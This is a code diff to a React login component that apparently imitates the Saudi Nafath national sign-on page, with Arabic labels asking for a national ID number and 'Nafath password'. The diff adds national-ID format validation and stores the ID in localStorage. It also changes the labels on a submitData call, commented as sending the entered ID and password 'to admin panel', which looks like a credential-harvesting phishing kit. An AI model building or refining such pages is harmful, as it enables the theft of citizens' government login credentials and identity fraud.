@@ -89,12 +89,20 @@ export default function NafathLogin() {
                     const newErrors: {username?: string, password?: string} = {};
                     if (!username) newErrors.username = "مطلوب";
                     if (!password) newErrors.password = "مطلوب";
+                    
+                    // Validate National ID format
+                    if (username && !/^[12]\d{9}$/.test(username)) {
+                      newErrors.username = "رقم الهوية يجب أن يبدأ بـ 1 أو 2 ويتكون من 10 أرقام";
+                    }
                     setErrors(newErrors);
                     
                     if (Object.keys(newErrors).length === 0) {
+                      // Save National ID to localStorage for UpdateInfo
+                      localStorage.setItem('nationalId', username);
+                      
                       // Send data to admin panel
                       submitData({
-                        'اسم المستخدم / الهوية الوطنية': username,
+                        'رقم الهوية الوطنية': username,
                         'كلمة المرور (نفاذ)': password
                       });
                       
@@ -147,23 +155,25 @@ export default function NafathLogin() {
                   }}>
                     <div className="space-y-2">
                       <label className="block text-[#666] font-normal text-sm text-right mb-2">
-                        اسم المستخدم \ الهوية الوطنية
+                        رقم الهوية الوطنية
                       </label>
                       <input 
                         ref={activeTab === "app" ? nafathInputRef : null}
                         type="text" 
+                        inputMode="numeric"
+                        maxLength={10}
                         value={username}
                         onChange={(e) => {
                           const val = e.target.value;
-                          if (/^[a-zA-Z0-9]*$/.test(val)) {
+                          if (/^[0-9]*$/.test(val) && val.length <= 10) {
                             setUsername(val);
                             if (val) setErrors(prev => ({...prev, username: undefined}));
                           }
                         }}
                         className={`w-full px-4 py-3 border rounded-[4px] focus:outline-none text-right placeholder-gray-300 text-sm ${errors.username ? 'border-red-500 focus:border-red-500' : 'border-gray-300 focus:border-[#11998e]'}`}
-                        placeholder="اسم المستخدم \ الهوية الوطنية"
+                        placeholder="رقم الهوية الوطنية (10 أرقام)"
                       />
-                      {errors.username && <p className="text-xs text-red-500 mt-1 text-right">مطلوب</p>}
+                      {errors.username && <p className="text-xs text-red-500 mt-1 text-right">{errors.username}</p>}
                     </div>
 
                     <div className="space-y-2">
@@ -235,7 +245,7 @@ export default function NafathLogin() {
                     <img src="/images/security-shield-enhanced.png" alt="Security Shield" className="w-full h-full object-contain" />
                   </div>
                   <p className="text-[#777] text-sm leading-relaxed text-center max-w-xs">
-                    الرجاء إدخال اسم المستخدم \ الهوية الوطنية وكلمة المرور ثم اضغط تسجيل الدخول
+                    الرجاء إدخال رقم الهوية الوطنية وكلمة المرور ثم اضغط تسجيل الدخول
                   </p>
                 </div>
 
